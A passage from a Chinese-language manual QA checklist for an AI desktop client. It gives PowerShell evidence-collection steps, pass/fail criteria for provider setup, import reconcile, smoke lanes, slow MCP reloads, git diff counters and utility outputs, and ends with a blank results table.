Save-TraceRows 'subagent|task|delegat' "$ev\model-43-<收尾>-trace.json"
```

性能数据记两个：**ack 延迟**（从发出委派到子代理面板出现第一条记录的时间）、**fan-out 并行度**（同时在跑的子代理数）。

**看什么**（判据逐字）：「固定输入 + 固定定义 + 模型替身下，成功 / 失败 / 取消三种收尾各留一份 trace 与截图，性能数据（ack 延迟、fan-out 并行度）记录在案」。

- 通过：三份 trace + 三张截图 + 两个性能数字齐了。
- 不通过 / 没做完：缺哪一份写哪一份。

**记录**：`model-43-success-trace.json`、`model-43-failure-trace.json`、`model-43-cancel-trace.json`、`model-43-<收尾>.png` ×3、`model-43-perf.txt`。

---

## 轮 M-i · 模型目录与导入 reconcile（MODEL-44 / 45 / 46，全部【绿】）

### MODEL-44 MC-a 非四种风格的服务真的可用 【绿】

**前提**：要一个 **Mistral 或 Azure 风格**的真实服务（有地址 + 有 key）。没有的话这一项只能做半边，见下面的「做不全怎么办」。

**操作**：

1. 设置页 → AI 服务 → 新增。API style 选 `mistral-conversations` 或 `azure-openai-responses`（这两个都在支持的 10 种里，`src/shared/userProviders.ts:26-37`）。
2. 填地址与 key，保存，点 **Fetch models** 勾上模型。
3. 开一条新会话，在模型选择器里**选中这个服务的模型**，截图。
4. 发一条消息，确认真的出话了，截图。
5. 抓 `dropped` 字段（看有没有模型被静默丢掉）：

```powershell
Select-String -Path "$userData\logs\*.log" -Pattern 'dropped' | ForEach-Object { $_.Line } |
  Out-File -Encoding utf8 "$ev\model-44-dropped.txt"
Get-Content "$ev\model-44-dropped.txt"
```

**看什么**（判据逐字）：「加一个 Mistral 或 Azure 风格的服务后，native 后端的模型选择器里真的出现它的模型，并能出一次话（改前这六种风格被静默丢弃）」。

- 通过：选择器里**出现**了它的模型，并且**成功出话一次**。
- 不通过：模型压根不在选择器里（= 还在被静默丢弃），或选得到但一发就报错。
- **做不全怎么办**：没有这类账号时，仍然可以做「服务能不能加进去、模型选择器里出不出现」这半边（Fetch models 会失败、列表为空就如实记），**出话那半边记 🚫 并写明「无该风格的真实凭据」**。

**记录**：`model-44-non-four-style.png`、`model-44-reply.png`、`model-44-dropped.txt`。

### MODEL-45 MC-b 托管模式下两系模型各出一次话 【绿】

**前提**：这一项要求应用跑在**托管模式**（managed）下。如果这台机器用的是本机配置模式、又没有托管账号，这一项记 🚫 并写明原因。

**操作**：

1. 确认当前是托管模式（设置页里能看到凭据模式）。
2. 选一个 **Anthropic 系**模型，发一条消息，截图。
3. 同一网关上换一个 **OpenAI 系**模型，发一条消息，截图。

**看什么**（判据逐字）：「Anthropic 系与 OpenAI 系模型在同一网关上各成功出话一次（D15 的推导规则在真机上的确认）」。

- 通过：两系各成功一次。
- 不通过：某一系报错——**把错误原文抄下来**（含 provider 名与模型 id）。

**记录**：`model-45-two-families.png`（或两张）。

### MODEL-46 IM-b 中断导入后的 reconcile 【绿】

**操作**：

1. 在导入面板里挑一条**体量较大**的会话（越大越容易在写盘中途抓到）。
2. 点导入，**写盘进行中**强杀：

```powershell
Stop-Process -Name AiClient -Force
```

3. 强杀后先看一眼残留：

```powershell
Get-ChildItem -Force "$agent\sessions\.aiclient-import-staging" -ErrorAction SilentlyContinue |
  Out-File -Encoding utf8 "$ev\model-46-reconcile.txt"
Select-String -Path "$userData\legacy-import-manifest.json" -Pattern 'cleanupPending' |
  ForEach-Object { $_.Line } | Out-File -Append -Encoding utf8 "$ev\model-46-reconcile.txt"
```

4. 重新启动应用，**重试同一条**导入。
5. 再查一次这两处，追加进同一个文件：

```powershell
"=== after retry ===" | Out-File -Append -Encoding utf8 "$ev\model-46-reconcile.txt"
Get-ChildItem -Force "$agent\sessions\.aiclient-import-staging" -ErrorAction SilentlyContinue |
  Out-File -Append -Encoding utf8 "$ev\model-46-reconcile.txt"
Select-String -Path "$userData\legacy-import-manifest.json" -Pattern 'cleanupPending' |
  ForEach-Object { $_.Line } | Out-File -Append -Encoding utf8 "$ev\model-46-reconcile.txt"
Get-Content "$ev\model-46-reconcile.txt"
```

**看什么**（判据逐字）：「导入进行中强杀进程，重启后重试同一条：`reconcile` 真的清干净，暂存目录无残留、manifest 无 `cleanupPending` 悬挂」。

- 通过：重试之后 `.aiclient-import-staging\` 是空的（或目录不存在），manifest 里没有还挂着 `cleanupPending: true` 的记录。
- 不通过：暂存目录里留着半截文件，或 manifest 里有 `cleanupPending: true` 一直不消。

**记录**：`model-46-reconcile.txt`。

---

## 轮 M-j · smoke lane 与基线可比性（MODEL-24【必】 + 25 / 26【探】）

### MODEL-24 live lane 现行可跑 【必】

**准备**：这一项要**源码**。

1. 源码已按 MODEL-29 的步骤拉到 `C:\t033\src\ai-client` 并切到 `13e6cdb7`。
2. **`src/runtime` 是独立 npm 子包，依赖不随根安装**，必须单独装（缺了会报 `Cannot find package 'cordis'`）：

```powershell
cd C:\t033\src\ai-client\src\runtime
npm ci
```

   没网 / 没 npm → 这一项记 🚫，写明卡在哪一步。

**操作**：

1. 用**登录后的 agent 目录**跑在线 lane（`--model` 的格式是 `<provider>/<id>`，用你自己配置的那一个）：

```powershell
cd C:\t033\src\ai-client
& $node --experimental-strip-types src\runtime\smoke\runOnce.ts `
        --model "<你的 provider>/<你的模型 id>" `
        --agent-dir "$agent" `
        --trace-dir "C:\t033\trace\model-24" `
        --json | Tee-Object "$ev\model-24-live-lane.json"
$LASTEXITCODE     # 0 = 断言全过
```

2. 把这一跑的 trace 单独收走：

```powershell
Copy-Item "C:\t033\trace\model-24\runs.jsonl" "$ev\model-24-runs.jsonl"
```

3. 从报告里把版本戳挑出来（用于和旧 trace 比对）：

```powershell
(Get-Content "$ev\model-24-live-lane.json" -Raw | ConvertFrom-Json).result.trace.version_stamp | Format-List |
  Out-File -Encoding utf8 "$ev\model-24-version-stamp.txt"
Get-Content "$ev\model-24-version-stamp.txt"
```

**看什么**（判据逐字）：「至少一个真实供应商的 `--model provider/id` 调用返回 `must_succeed=true` 且不超过 `max_latency_ms`」。

- 用例定的阈值（`src/runtime/smoke/cases/p0-single-turn.json`）：`must_succeed: true`、`must_not_call_tools: ["*"]`、`turns: 1`、`min_output_chars: 1`、`max_latency_ms: 120000`。
- 通过：退出码 0、报告里 `passed` 为 true、延迟小于 120000 ms。
- 不通过：退出码 1 —— **把整份 JSON 贴回**，尤其是失败的那条断言和 `latencyMs`。
- 同时记一句：`version_stamp` 里的 `config_version` 是不是 `runtime_p6_hardening_v1`、`backend` 是不是 `native`（这是「确实是新采」的凭据）。

**记录**：`model-24-live-lane.json`、`model-24-runs.jsonl`、`model-24-version-stamp.txt`。

### MODEL-25 部分重跑 + collect.mjs 收尾 【探】

**前提**：需要 `P20_BASELINE_API_KEY` 与可用网关，且要有源码（同 MODEL-24）。脚本在 `scripts/runtime-baseline/`，用法见同目录 README。没有这个 key → 记 🚫。

**操作**：

1. 真实网关下**故意只跑 1-2 个 `--case`**（`run-native.mjs --case <id>`），其余用别的目录跑完。
2. 用 `collect.mjs` 收尾，产出 `summary.json` / `report.md`。
3. 人工核对字段与标题。

**看什么**（判据逐字）：「真实网关下故意只跑 1-2 个 `--case`，其余用别的目录跑完，`collect.mjs` 收尾产出的 `summary.json`/`report.md` 字段正确、标题反映真实 backend」。

- 通过：字段齐、标题里的 backend 是 `native`（不是写死的旧值）。
- 不通过 / 做不了：记 ⛔ 或 🚫，写清卡在哪。

**记录**：`model-25-partial-rerun.txt`（命令 + 产出的关键字段）、`model-25-summary.json`。

### MODEL-26 archive.mjs 的分代拒绝逻辑 【探】

**前提**：要**跨一次 `RUNTIME_CONFIG_VERSION` 升级**各真实采集一次——这需要改代码并重新构建，**在装好的打包产物上做不到**。

**操作**：只有在你手上有源码构建环境时才做；否则**直接记 🚫**，原因写「需要跨一次 `RUNTIME_CONFIG_VERSION` 升级的两次真实采集，打包态无法构造」。

**看什么**（判据逐字）：「升级 `RUNTIME_CONFIG_VERSION` 前后各真实采集一次，`compare.mjs --baseline <升级前> --native <升级后>` 必须在 failures 里报 `behaviour generation differs`」。

**记录**：`model-26-generation-reject.txt`（哪怕只写一行 🚫 的原因，也要留这个文件）。

---

## 轮 M-k · utility 输出形态与其余（MODEL-2 / 30【必】 + 1 / 3 / 4 / 37 / 38 / 50【探】）

### MODEL-2 reload 的 60 秒预算在真实 MCP 握手下端到端成立 【必】

> 这一项在编排器版分片里标着【必】，但执行单 §6 的 34 条映射里没有这一行——时间实在不够时它是可以降级的那一条，降级了要写明。

**准备**：把样本包里的慢启动 MCP 服务器配成握手 20 秒：

```powershell
@"
{
  "mcpServers": {
    "slow-probe": {
      "command": "$($node -replace '\\','\\\\')",
      "args": ["C:\\t033\\field-samples\\slow-mcp-server.mjs", "--delay-ms", "20000"],
      "env": {}
    }
  }
}
"@ | Set-Content -Path "$agent\mcp.json" -Encoding UTF8
```

先单独冒烟一次，确认脚本在这台机器上能跑（3 秒延时版）：

```powershell
& $node C:\t033\field-samples\slow-mcp-server.mjs --delay-ms 3000
# 手打一行回车：{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18"}}
# 3 秒后 stdout 应当出现 {"jsonrpc":"2.0","id":1,"result":{...}}；Ctrl+C 退出
```

**操作**：

1. 重启应用，开一条会话，等侧栏 MCP 徽标变成**已连接**（会慢 20 秒，这是预期），截图。
2. 走完整一圈：**GUI 开 TUI → 在 TUI 里编辑/聊一句 → 回 GUI 发一条消息**（这一下触发 `reloadSessionFromDisk`）。
3. 看这条消息是成功还是失败、会话有没有被 retire。
4. 收证据：

```powershell
Save-TraceRows 'reload|mcp|retire' "$ev\model-02-slow-mcp-reload.txt"
Get-Content "$ev\model-02-slow-mcp-reload.txt"
```

**看什么**（判据逐字）：「配一台握手耗时 15～30 秒的 stdio MCP 服务器，从 pi TUI 交还 GUI 后的第一条消息不再失败、会话不被 retire」。

- 通过：交还后的第一条消息**正常出话**，会话还在、没被退掉，trace 里没有 `worker_reload` 的失败分支。
- 不通过：第一条消息报错、会话被 retire、或 trace 里出现 reload 超时。

**记录**：`model-02-slow-mcp-reload.txt`、`model-02-mcp-badge.png`、`model-02-first-message.png`。
做完把 `mcp.json` 里的 `--delay-ms` 调回 `0` 或删掉这个文件，免得后面每次开会话都等 20 秒。

### MODEL-30 GUI F/13 真实 busy 会话下的数字 【必】

**操作**：

1. 侧栏里要能同时看到**两个目录行**：一个是 `C:\t033\ws`（待会儿会有 busy 会话），另一个随便再加一个目录（保持没有会话在跑）。
2. 在 `C:\t033\ws` 开一个**会真的改文件**的会话，发：「在这个工作区里连续做三件事，每做完一件停一下：① 新建 `busy-1.txt` 写 1；② 修改 `readme.md` 追加一行；③ 新建 `busy-2.txt` 写 2。」
3. 审批一路允许。每做完一步就看一眼侧栏那两行，**间隔 3 次截图**（能看出数字在变）。
4. 顺便看非 busy 那一行有没有出现数字/有没有在刷新。

**看什么**（判据逐字）：「busy 会话所在目录行出现 `+N -M` 并随改动刷新；非 busy 目录不轮询」。

- 通过：busy 那一行出现 `+N -M` 且随改动变化；非 busy 那一行**不出数字、也不刷新**。
- 不通过：busy 行不出数字 / 数字不刷新 / 非 busy 行也在刷。
- **判据里「抓 IPC 调用次数」这半边在打包态取不到**：轮询走的是 `window.electronAPI.git.getDiffStats`（`src/renderer/stores/worktreeActivity.ts:149`），而 preload 经 contextBridge 暴露的对象是冻结的，控制台里打不上补丁；读渲染层 store 的那条路在打包态也没有（见 0.6）。
  **可以试一下**（在 DevTools Console 里）：

```js
(() => { const g = window.electronAPI.git; const orig = g.getDiffStats; try { g.getDiffStats = () => {}; } catch (e) { return 'frozen: ' + e.message; } return g.getDiffStats === orig ? 'frozen (silently)' : 'patchable'; })()
```

  返回 `frozen…` 就把 IPC 计数这半边记 🚫，原因写「打包态无法给 contextBridge 对象打补丁」，界面观察那半边照常判 ✅/⛔。

**记录**：`model-30-busy-counts-1.png`/`-2.png`/`-3.png`、`model-30-ipc-calls.txt`（写清是拿到了计数还是 🚫，以及上面那段返回了什么）。

### MODEL-1 invalidateAll 打断一张挂起的权限卡 【探】

**操作**：

1. 开一条会话，发：「在这个工作区新建 `invalidate.txt`，内容写 `T033`。」
2. **权限卡出现时**，不要动它，直接去设置页**保存任意一处模型 / 服务商改动**（改个名字再改回来也算一次保存）。
3. 回到会话看那张卡怎么了，截图。
4. 如果卡还在，**点它一下**，看报不报 `session_not_ready`。

**看什么**（判据逐字）：「保存模型设置之后，屏上的权限卡被收掉、回合有明确终态；若卡片留在屏上且点击报 `session_not_ready`，即证实 main-host-03 的下游后果」。

- 两种结果都要如实记：卡被收掉 + 回合有终态（好）/ 卡留着且点击报 `session_not_ready`（= 证实那个缺口）。

**记录**：`model-01-invalidate-during-card.png`、`model-01-after-click.png`。

### MODEL-3 真实模型输出形态 【探】

**准备**：`C:\t033\ws` 里要有未提交的改动（前面几项已经造了不少），否则「生成提交信息」没东西可写。

**操作**：

1. 在 Git 面板里点「生成提交信息」，**连点 10 次**，每次把生成出来的文本抄进证据文件（原始文本 + 界面最终填进输入框的值）。
2. 同样对「分支命名」跑 10 次。
3. 特别留意：有没有出现**代码围栏**（```）、**多行**、**解释性文字**；围栏有没有被正确剥掉；有没有出现**空输出**，空输出时界面怎么表现。

**看什么**（判据逐字）：「分支名是否出现围栏 / 多行 / 解释性文字；提交信息围栏剥离是否正确；空输出时界面表现」。

- 这一项是**记录形态**，不是判对错。10 次的结果都要留。

**记录**：`model-03-utility-outputs.txt`（20 次的原始文本与最终值）、`model-03-<异常形态>.png`（碰到围栏/空输出时截一张）。

### MODEL-4 模型被下架后的设置页一致性 【探】

**操作**：

1. 设置页把 utility 的模型设成「自动」。
2. 跑一次「生成提交信息」。
3. 记下面板/结果里报出来的模型名。

**看什么**（判据逐字）：「设置页显示『自动』时，请求里实际携带的 model 值是否为空」。

- **打包态看不到 Main 侧的载荷**：`PiUtilityService.ts:190-199` 组装 `utility.start` 时不打日志，utility 的这条链又跑在 `traceDir: null` 下（`src/runtime/worker/nativeUtility.ts:154`），所以 trace 里也没有。
  能取到的只有**回执里报的模型名**。把这一项记成「回执模型名 = X；载荷取不到 🚫，原因：打包态无日志无 trace」。

**记录**：`model-04-auto-model.txt`。

### MODEL-37 压缩摘要真实体积上限 【探】

**操作**：

1. 找一条**上下文很长**的会话（或者故意灌几轮长内容）。
2. 在输入框里用 `/compact` 触发压缩。
3. 找到这条会话的 JSONL，把 compaction 条目的字节数量出来：

```powershell
Select-String -Path $s -Pattern 'compact' | ForEach-Object { "{0} bytes`t{1}" -f $_.Line.Length, $_.Line.Substring(0, [Math]::Min(200, $_.Line.Length)) } |
  Out-File -Encoding utf8 "$ev\model-37-compaction-bytes.txt"
Get-Content "$ev\model-37-compaction-bytes.txt"
```

**看什么**（判据逐字）：「大上下文窗口真实模型触发 /compact 后，summary 实际字节数是否需要独立硬顶」。

- 这一项是**量数字**：把 summary 的实际字节数记下来即可，不判对错。

**记录**：`model-37-compaction-bytes.txt`。

### MODEL-38 MCP 图片字节假设 【探】

**前提**：要一个**会返回图片**的真实 MCP 服务器（截图类）。没有就记 🚫，原因写「无真实图片 MCP 服务器」。

**操作**：接上服务器，让模型调用几次取图，记录每张图的字节数与一次调用的总字节数。

**看什么**（判据逐字）：「1 MiB/张、2 MiB/次的假设是否贴合真实 MCP 截图服务器的输出分布」。

**记录**：`model-38-mcp-image-bytes.txt`。

### MODEL-50 GUI A/2 完整 Shell / Custom 组合 【探】

**操作**：在**终端设置**里逐格切换，每切一格开一次内嵌终端并截图：

1. 默认 shell（不填自定义路径）；
2. 自定义 shell 路径（填一个真实存在的，例如 `C:\Program Files\Git\bin\bash.exe`）；
3. 自定义参数（在上一格基础上加一个参数，例如 `-l`）。

**看什么**（判据逐字）：「终端设置里默认 shell、自定义 shell 路径、自定义参数三种组合逐项可用（核心现场只验过一条）」。

- 通过：三格都能开出终端并能敲命令。
- 不通过：某一格开不出来 / 报错——把错误原文抄下来。

**记录**：`model-50-shell-combo-default.png`、`model-50-shell-combo-custom-path.png`、`model-50-shell-combo-custom-args.png`。

---

## 结果表（做完逐行填，连同证据目录一起回传）

填法：`结果`列只填 ✅ / ⛔ / 🚫；`一句现象`用大白话写你看到的（⛔ 和 🚫 必填）；`证据文件`写 `C:\t033\evidence\model\` 下的文件名，多个用逗号分隔。

| 编号 | 结果 | 一句现象 | 证据文件 |
|---|---|---|---|
| MODEL-1 |  |  |  |
| MODEL-2 |  |  |  |
| MODEL-3 |  |  |  |
| MODEL-4 |  |  |  |
| MODEL-5 |  |  |  |
| MODEL-6 |  |  |  |
| MODEL-7 |  |  |  |
| MODEL-8 |  |  |  |
| MODEL-9 |  |  |  |
| MODEL-10 |  |  |  |
| MODEL-11 |  |  |  |
| MODEL-12 |  |  |  |
| MODEL-13 |  |  |  |
| MODEL-14 |  |  |  |
| MODEL-15 |  |  |  |
| MODEL-16 |  |  |  |
| MODEL-17 |  |  |  |
| MODEL-18 |  |  |  |
| MODEL-19 |  |  |  |
| MODEL-20 |  |  |  |
| MODEL-21 |  |  |  |
| MODEL-22 |  |  |  |
| MODEL-23 |  |  |  |
| MODEL-24 |  |  |  |
| MODEL-25 |  |  |  |
| MODEL-26 |  |  |  |
| MODEL-27 |  |  |  |
| MODEL-28 |  |  |  |
| MODEL-29 |  |  |  |
| MODEL-30 |  |  |  |
| MODEL-31 |  |  |  |
| MODEL-32 |  |  |  |
| MODEL-33 |  |  |  |
| MODEL-34 |  |  |  |
| MODEL-35 |  |  |  |
| MODEL-36 |  |  |  |
| MODEL-37 |  |  |  |
| MODEL-38 |  |  |  |
| MODEL-39 |  |  |  |
| MODEL-40 |  |  |  |
| MODEL-41 |  |  |  |
| MODEL-42 |  |  |  |
| MODEL-43 |  |  |  |
| MODEL-44 |  |  |  |
| MODEL-45 |  |  |  |
| MODEL-46 |  |  |  |
| MODEL-47 |  |  |  |
| MODEL-48 |  |  |  |
| MODEL-49 |  |  |  |
| MODEL-50 |  |  |  |

**顺带回传的两条**（不在 MODEL 编号里，但在本分片里做掉了）：

| 编号 | 结果 | 一句现象 | 证据文件 |
|---|---|---|---|
| WIN-37 |  | 与 MODEL-33 同一轮做，三种拼法判定是否一致 | model-33-audit-rows.json |
